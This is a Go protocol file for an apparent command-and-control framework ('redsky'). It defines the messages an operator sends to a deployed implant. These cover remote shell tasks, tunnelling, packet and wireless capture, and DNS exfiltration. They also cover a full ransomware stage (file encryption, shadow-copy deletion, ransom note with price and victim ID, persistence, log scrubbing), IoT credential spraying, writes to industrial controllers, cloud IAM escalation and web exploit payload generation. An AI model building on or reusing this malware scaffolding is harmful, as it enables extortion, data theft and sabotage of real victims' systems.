// Package proto defines the on-wire message types between redsky-core and
// redsky-agent. JSON is the default encoding. Every message carries a Type
// field so the receiver can dispatch without a separate envelope.
package proto

import "encoding/json"

// MessageType identifies what a message is.
type MessageType string

const (
	// Core -> agent
	TypeTask        MessageType = "task"
	TypeFilePut     MessageType = "file_put"
	TypeFileGet     MessageType = "file_get"
	TypeTunnelOpen  MessageType = "tunnel_open"
	TypeTunnelClose MessageType = "tunnel_close"
	TypeSleep       MessageType = "sleep"
	TypeKill        MessageType = "kill"
	TypeKeyRotate   MessageType = "key_rotate"

	// Agent -> core
	TypeBeacon     MessageType = "beacon"
	TypeResult     MessageType = "result"
	TypeFileChunk  MessageType = "file_chunk"
	TypeTunnelData MessageType = "tunnel_data"
	TypeError      MessageType = "error"

	// Tunnel control (bidirectional)
	TypeTunnelReady MessageType = "tunnel_ready"
	TypeTunnelFail  MessageType = "tunnel_fail"

	// Packet capture (agent -> core)
	TypeCaptureStart MessageType = "capture_start"
	TypeCaptureStop  MessageType = "capture_stop"
	TypeCaptureData  MessageType = "capture_data"
	TypeCaptureDone  MessageType = "capture_done"
	TypeCaptureFail  MessageType = "capture_fail"

	// DNS exfil (agent -> core, over the wire as DNS queries)
	TypeDNSExfilChunk MessageType = "dns_exfil_chunk"
	TypeDNSExfilDone  MessageType = "dns_exfil_done"

	// Wireless capture (agent -> core)
	TypeWirelessStart MessageType = "wireless_start"
	TypeCryptoStart   MessageType = "crypto_start"
	TypeCryptoData    MessageType = "crypto_data"
	TypeKeyPush       MessageType = "key_push"
	TypeIoTCredsStart MessageType = "iotcreds_start"
	TypeIoTCredsData  MessageType = "iotcreds_data"
	TypeIcsStart      MessageType = "ics_start"
	TypeIcsData       MessageType = "ics_data"
	TypeCloudStart    MessageType = "cloud_start"
	TypeCloudData     MessageType = "cloud_data"
	TypeCryptoOpStart MessageType = "crypto_op_start"
	TypeCryptoOpData  MessageType = "crypto_op_data"
	TypeSocialStart   MessageType = "social_start"
	TypeSocialData    MessageType = "social_data"
	TypeWebSSRFStart  MessageType = "webssrf_start"
	TypeWebSSRFData   MessageType = "webssrf_data"
	TypeWebSSTIStart  MessageType = "webssti_start"
	TypeWebSSTIData   MessageType = "webssti_data"
	TypeWebXXEStart   MessageType = "webxxe_start"
	TypeWebXXEData    MessageType = "webxxe_data"
	TypeWebXSSStart   MessageType = "webxss_start"
	TypeWebXSSData    MessageType = "webxss_data"
	TypeWirelessStop  MessageType = "wireless_stop"
	TypeWirelessData  MessageType = "wireless_data"
	TypeWirelessDone  MessageType = "wireless_done"
	TypeWirelessFail  MessageType = "wireless_fail"
)

// Envelope wraps every message. Payload is the raw JSON of the concrete type
// named by Type.
type Envelope struct {
	Type    MessageType     `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

// AgentInfo is the host description an agent sends on every beacon.
type AgentInfo struct {
	Hostname     string   `json:"hostname"`
	OS           string   `json:"os"`
	Arch         string   `json:"arch"`
	User         string   `json:"user"`
	UID          int      `json:"uid"`
	PID          int      `json:"pid"`
	Capabilities []string `json:"capabilities"`
}

// Beacon is what the agent sends to check in.
type Beacon struct {
	AgentID string    `json:"agent_id"`
	Info    AgentInfo `json:"info"`
	TS      int64     `json:"ts"`
}

// Task is a command the core wants the agent to run.
//
// Kind distinguishes how the agent should handle it:
//
//	"shell"     — exec.Command(Cmd, Args...)
//	"framework" — dispatch to an internal Go function named Cmd with Args
type Task struct {
	ID      string   `json:"id"`
	Kind    string   `json:"kind,omitempty"`
	Cmd     string   `json:"cmd"`
	Args    []string `json:"args"`
	Timeout int      `json:"timeout"`
}

// Result is the agent's answer to a Task.
type Result struct {
	TaskID   string `json:"task_id"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
	Error    string `json:"error,omitempty"`
}

// Sleep changes the beacon interval.
type Sleep struct {
	MS int `json:"ms"`
}

// Kill tells the agent to self-destruct.
type Kill struct{}

// ErrorReport is a generic error from the agent.
type ErrorReport struct {
	TaskID  string `json:"task_id,omitempty"`
	Message string `json:"message"`
}

// TunnelOpen is sent by core to ask the agent to dial (host:port).
type TunnelOpen struct {
	TunnelID string `json:"tunnel_id"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
}

// TunnelData is one chunk of a tunnel stream. Direction is implied by sender.
// Data is base64-encoded on the wire via JSON []byte marshalling.
type TunnelData struct {
	TunnelID string `json:"tunnel_id"`
	Data     []byte `json:"data"`
	EOF      bool   `json:"eof,omitempty"`
}

// TunnelClose asks both ends to tear down a tunnel.
type TunnelClose struct {
	TunnelID string `json:"tunnel_id"`
	Reason   string `json:"reason,omitempty"`
}

// TunnelReady is the agent's acknowledgement that a tunnel is dialed.
type TunnelReady struct {
	TunnelID string `json:"tunnel_id"`
}

// TunnelFail is the agent's failure report.
type TunnelFail struct {
	TunnelID string `json:"tunnel_id"`
	Error    string `json:"error"`
}

// CaptureStart asks the agent to begin a packet capture on iface.
type CaptureStart struct {
	SessionID string `json:"session_id"`
	Iface     string `json:"iface"`
	Filter    string `json:"filter,omitempty"`  // optional BPF, agent-side only supports "any" for now
	Snaplen   int    `json:"snaplen,omitempty"` // 0 = full frames
}

// CaptureStop asks the agent to stop the capture with the given session.
type CaptureStop struct {
	SessionID string `json:"session_id"`
}

// CaptureData is one chunk of captured frames.
type CaptureData struct {
	SessionID string `json:"session_id"`
	Data      []byte `json:"data"`  // chunk of pcap-format bytes
	Count     int    `json:"count"` // number of frames in this chunk
}

// CaptureDone signals the capture ended cleanly.
type CaptureDone struct {
	SessionID string `json:"session_id"`
	Total     int    `json:"total"`
	Bytes     int64  `json:"bytes"`
}

// CaptureFail reports an error starting the capture.
type CaptureFail struct {
	SessionID string `json:"session_id"`
	Error     string `json:"error"`
}

// DNSExfilChunk is metadata about one DNS exfil payload. The actual bytes
// travel in DNS query labels; this struct is only used to route the decoded
// payload through the framework's internal message bus.
type DNSExfilChunk struct {
	SessionID string `json:"session_id"`
	Seq       int    `json:"seq"`
	Total     int    `json:"total"`
	Payload   []byte `json:"payload"`
}

// DNSExfilDone signals a DNS exfil session completed.
type DNSExfilDone struct {
	SessionID string `json:"session_id"`
	Bytes     int64  `json:"bytes"`
	Chunks    int    `json:"chunks"`
}

// WirelessStart asks the agent to begin an 802.11 capture.
type WirelessStart struct {
	SessionID string `json:"session_id"`
	Iface     string `json:"iface"`
	Channel   int    `json:"channel,omitempty"`
}

// WirelessStop ends the capture.
type WirelessStop struct {
	SessionID string `json:"session_id"`
}

// WirelessData carries one chunk of pcapng-format 802.11 frames.
type WirelessData struct {
	SessionID string `json:"session_id"`
	Data      []byte `json:"data"`
	Count     int    `json:"count"`
}

// WirelessDone signals a clean end.
type WirelessDone struct {
	SessionID string `json:"session_id"`
	Total     int    `json:"total"`
	Bytes     int64  `json:"bytes"`
}

// WirelessFail reports a capture error.
type WirelessFail struct {
	SessionID string `json:"session_id"`
	Error     string `json:"error"`
}

// CryptoStart kicks off a ransomware run on an agent. The agent encrypts
// the target tree, kills VSS snapshots (Windows), and drops the ransom
// note. Progress and result come back as CryptoData messages.
type CryptoStart struct {
	SessionID string `json:"session_id"`
	Root      string `json:"root"`     // directory to walk
	KeyID     uint32 `json:"key_id"`   // which operator key the wrapped AES keys target
	DryRun    bool   `json:"dry_run"`  // enumerate + report, write nothing
	KillVSS   bool   `json:"kill_vss"` // run the shadow-copy stage
	Note      bool   `json:"note"`     // drop the ransom note
	// note parameters — required if Note is true
	ContactEmail string `json:"contact_email"`
	Address      string `json:"address"`
	Price        string `json:"price"`
	VictimID     string `json:"victim_id"`
	// poststage options
	PostPersist   bool   `json:"post_persist,omitempty"`
	PostWallpaper bool   `json:"post_wallpaper,omitempty"`
	WallpaperPath string `json:"wallpaper_path,omitempty"`
	PostLogScrub  bool   `json:"post_log_scrub,omitempty"`
	PersistName   string `json:"persist_name,omitempty"`
	PersistOnBoot bool   `json:"persist_on_boot,omitempty"`
}

// CryptoData streams progress back to core.
type CryptoData struct {
	SessionID string `json:"session_id"`
	Stage     string `json:"stage"` // "walk", "encrypt", "shadow", "note", "done"
	Path      string `json:"path"`  // current file, if applicable
	Done      int64  `json:"done"`  // count of items processed
	Total     int64  `json:"total"` // total found (0 if unknown)
	Bytes     int64  `json:"bytes"` // bytes processed, running total
	OK        bool   `json:"ok"`
	Error     string `json:"error,omitempty"`
}

// KeyPush delivers an arbitrary file to the agent. Used to ship the operator
// public key for the crypto stage, and available for any future file push.
type KeyPush struct {
	SessionID string `json:"session_id"`
	Filename  string `json:"filename"`
	Data      []byte `json:"data"` // base64 over JSON
	Mode      uint32 `json:"mode"` // unix mode bits (0 = default 0600)
}

// IoTCredsStart kicks off a default-credential spray on the agent.
type IoTCredsStart struct {
	SessionID string `json:"session_id"`
	Host      string `json:"host"`
	Port      int    `json:"port"`
	Protocol  string `json:"protocol"` // http|https|telnet|ssh
	Path      string `json:"path"`     // http only
	Timeout   int    `json:"timeout"`  // seconds
	StopFirst bool   `json:"stop_first"`
}

// IoTCredsData streams spray progress back to core.
type IoTCredsData struct {
	SessionID string `json:"session_id"`
	Index     int    `json:"index"`
	Total     int    `json:"total"`
	Vendor    string `json:"vendor"`
	User      string `json:"user"`
	Pass      string `json:"pass"`
	OK        bool   `json:"ok"`
	Done      bool   `json:"done"`
	Error     string `json:"error,omitempty"`
}

// IcsStart kicks off an ICS protocol operation on the agent. Protocol
// selects which of the icsgo primitives to drive. Fields that don't apply
// to the selected protocol are ignored.
type IcsStart struct {
	SessionID string `json:"session_id"`
	Protocol  string `json:"protocol"` // modbus|s7|dnp3
	Host      string `json:"host"`
	Port      int    `json:"port"`
	Action    string `json:"action"` // scan|read|write|dump|info|integrity|poll

	// Modbus
	Unit   uint8    `json:"unit"`
	Func   byte     `json:"func"` // MBFunc constant
	Start  uint16   `json:"start"`
	Count  uint16   `json:"count"`
	Value  uint16   `json:"value"`  // for single-register write
	Values []uint16 `json:"values"` // for multi-register write
	Bool   bool     `json:"bool"`   // for coil write

	// S7
	Area  byte   `json:"area"` // S7Area constant
	DB    uint16 `json:"db"`
	Data  []byte `json:"data"`   // for S7 write
	SZLID uint16 `json:"szl_id"` // for S7 SZL read

	// DNP3
	Dest  uint16 `json:"dest"`
	Src   uint16 `json:"src"`
	Class uint8  `json:"class"`
	// BACnet
	ObjType     uint16 `json:"obj_type,omitempty"`
	ObjInstance uint32 `json:"obj_instance,omitempty"`
	PropertyID  uint16 `json:"property_id,omitempty"`

	// EtherNet/IP
	Tag      string `json:"tag,omitempty"`
	DataType byte   `json:"data_type,omitempty"`
	RawValue []byte `json:"raw_value,omitempty"`
}

// IcsData streams progress / results back to core.
type IcsData struct {
	SessionID string `json:"session_id"`
	Stage     string `json:"stage"` // scan|read|write|result|done|error
	Message   string `json:"message"`
	Detail    string `json:"detail,omitempty"`
	OK        bool   `json:"ok"`
	Done      bool   `json:"done"`
}

// CloudStart kicks off a cloud-provider operation on the agent.
type CloudStart struct {
	SessionID string `json:"session_id"`
	Action    string `json:"action"` // probe|chain|identity|users|roles|simulate|driver

	// IMDS probe
	Cloud string `json:"cloud,omitempty"` // aws|gcp|azure

	// IAM walk / driver
	AccessKeyID     string `json:"access_key_id,omitempty"`
	SecretAccessKey string `json:"secret_access_key,omitempty"`
	SessionToken    string `json:"session_token,omitempty"`
	Region          string `json:"region,omitempty"`

	// simulate
	PolicySourceArn string   `json:"policy_source_arn,omitempty"`
	Actions         []string `json:"actions,omitempty"`

	// driver
	Driver       string `json:"driver,omitempty"`
	TargetUser   string `json:"target_user,omitempty"`
	TargetGroup  string `json:"target_group,omitempty"`
	PolicyARN    string `json:"policy_arn,omitempty"`
	VersionID    string `json:"version_id,omitempty"`
	RoleARN      string `json:"role_arn,omitempty"`
	SessionName  string `json:"session_name,omitempty"`
	Password     string `json:"password,omitempty"`
	PolicyName   string `json:"policy_name,omitempty"`
	DurationSecs int    `json:"duration_secs,omitempty"`
}

// CloudData streams progress / results back to core.
type CloudData struct {
	SessionID string `json:"session_id"`
	Stage     string `json:"stage"` // probe|identity|iam|simulate|driver|done|error
	Message   string `json:"message"`
	Detail    string `json:"detail,omitempty"`
	OK        bool   `json:"ok"`
	Done      bool   `json:"done"`
}

// CryptoOpStart drives one cryptogo operation on the agent.
type CryptoOpStart struct {
	SessionID string `json:"session_id"`
	Op        string `json:"op"` // derive|brainwallet|hash_crack|hash_id|java_recover|win_brute|mt_recover

	// derive / brainwallet
	PrivHex    string `json:"priv_hex,omitempty"`
	Passphrase string `json:"passphrase,omitempty"`

	// hash_crack / hash_id
	Algo       string `json:"algo,omitempty"`
	TargetHash string `json:"target_hash,omitempty"`
	Wordlist   string `json:"wordlist,omitempty"`

	// java_recover
	JavaA uint32 `json:"java_a,omitempty"`
	JavaB uint32 `json:"java_b,omitempty"`
	JavaN int    `json:"java_n,omitempty"`

	// win_brute
	WinFirst uint16 `json:"win_first,omitempty"`
	WinLo    uint32 `json:"win_lo,omitempty"`
	WinHi    uint32 `json:"win_hi,omitempty"`

	// mt_recover
	MTObs []uint32 `json:"mt_obs,omitempty"`
	MTN   int      `json:"mt_n,omitempty"`
}

// CryptoOpData streams results back to core.
type CryptoOpData struct {
	SessionID string `json:"session_id"`
	Stage     string `json:"stage"` // result|progress|error|done
	Message   string `json:"message"`
	Detail    string `json:"detail,omitempty"`
	OK        bool   `json:"ok"`
	Done      bool   `json:"done"`
}

// SocialStart drives a social-recon operation on the agent.
type SocialStart struct {
	SessionID string `json:"session_id"`
	Action    string `json:"action"` // username|gravatar|subdomains

	// username
	User string `json:"user,omitempty"`

	// gravatar
	Email string `json:"email,omitempty"`

	// subdomains
	Domain  string   `json:"domain,omitempty"`
	Words   []string `json:"words,omitempty"`
	Threads int      `json:"threads,omitempty"`
}

// SocialData streams progress / results back to core.
type SocialData struct {
	SessionID string `json:"session_id"`
	Stage     string `json:"stage"` // hit|miss|result|done|error
	Message   string `json:"message"`
	Detail    string `json:"detail,omitempty"`
	OK        bool   `json:"ok"`
	Done      bool   `json:"done"`
}

// WebSSRFStart drives an SSRF probe run on the agent.
type WebSSRFStart struct {
	SessionID string `json:"session_id"`
	// If Probes is empty, DefaultProbes are used.
	Probes  []WebSSRFProbe `json:"probes,omitempty"`
	Threads int            `json:"threads,omitempty"`
}

// WebSSRFProbe is one probe — a URL and its optional method/headers/body.
type WebSSRFProbe struct {
	Label   string            `json:"label"`
	URL     string            `json:"url"`
	Method  string            `json:"method,omitempty"`
	Headers map[string]string `json:"headers,omitempty"`
	Body    string            `json:"body,omitempty"`
}

// WebSSRFData streams results back to core.
type WebSSRFData struct {
	SessionID  string `json:"session_id"`
	Probe      string `json:"probe"`
	URL        string `json:"url"`
	OK         bool   `json:"ok"`
	Status     int    `json:"status"`
	BodyLen    int    `json:"body_len"`
	Body       string `json:"body,omitempty"`
	Err        string `json:"error,omitempty"`
	DurationMs int64  `json:"duration_ms"`
	Done       bool   `json:"done"`
}

// WebSSTIStart asks the agent to render SSTI payloads for a given engine
// and command. The agent does not send them anywhere — it just builds the
// payload strings and streams them back to the operator.
type WebSSTIStart struct {
	SessionID string `json:"session_id"`
	Engine    string `json:"engine,omitempty"`   // empty = all engines
	Cmd       string `json:"cmd"`                // command to embed
	ListFPs   bool   `json:"list_fps,omitempty"` // return fingerprint probes instead
}

// WebSSTIData streams rendered payloads back to core.
type WebSSTIData struct {
	SessionID string `json:"session_id"`
	Engine    string `json:"engine"`
	Label     string `json:"label"`
	Payload   string `json:"payload"`
	Notes     string `json:"notes,omitempty"`
	Kind      string `json:"kind"` // "payload" | "fingerprint" | "done"
	Done      bool   `json:"done"`
}

// WebXXEStart asks the agent to render XXE payloads.
type WebXXEStart struct {
	SessionID string `json:"session_id"`
	Kind      string `json:"kind,omitempty"` // in-band|oob|ssrf|dos|all
	File      string `json:"file,omitempty"`
	URL       string `json:"url,omitempty"`
	Attacker  string `json:"attacker,omitempty"`
	Defaults  bool   `json:"defaults,omitempty"` // include the default file/URL sweeps
}

// WebXXEData streams rendered payloads back to core.
type WebXXEData struct {
	SessionID string `json:"session_id"`
	Label     string `json:"label"`
	Kind      string `json:"kind"`
	Payload   string `json:"payload"`
	Notes     string `json:"notes,omitempty"`
	Extra     string `json:"extra,omitempty"` // e.g. "target=/etc/passwd"
	Done      bool   `json:"done"`
}

// WebXSSStart asks the agent to render XSS payloads for a given context.
type WebXSSStart struct {
	SessionID string `json:"session_id"`
	Context   string `json:"context,omitempty"` // html|attribute|url|script|css|dom|jsonp|markdown|all
	JS        string `json:"js,omitempty"`      // payload body; empty = "alert(1)"
	FPs       bool   `json:"fps,omitempty"`     // return framework fingerprints
}

// WebXSSData streams rendered payloads back to core.
type WebXSSData struct {
	SessionID string `json:"session_id"`
	Context   string `json:"context"`
	Label     string `json:"label"`
	Payload   string `json:"payload"`
	Notes     string `json:"notes,omitempty"`
	Kind      string `json:"kind"` // payload | fingerprint | done
	Done      bool   `json:"done"`
}
